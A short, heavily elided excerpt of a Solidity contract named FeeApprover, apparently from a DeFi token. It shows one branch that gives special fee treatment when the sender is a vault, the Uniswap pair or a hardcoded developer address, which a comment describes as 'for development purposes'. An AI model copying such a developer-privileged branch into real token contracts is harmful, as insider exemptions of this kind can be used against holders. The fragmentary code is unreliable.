...
contract FeeApprover is OwnableUpgradeSafe {
        ...
        )
    {
        ...
        // And when developer is sending (for development purposes)
        if(sender == d3vilVaultAddress || sender == tokenUniswapPair || sender == developerAddress) {
            ...
            transferToFeeDistributorAmount = _LPSupplyOfPairTotal;
        }
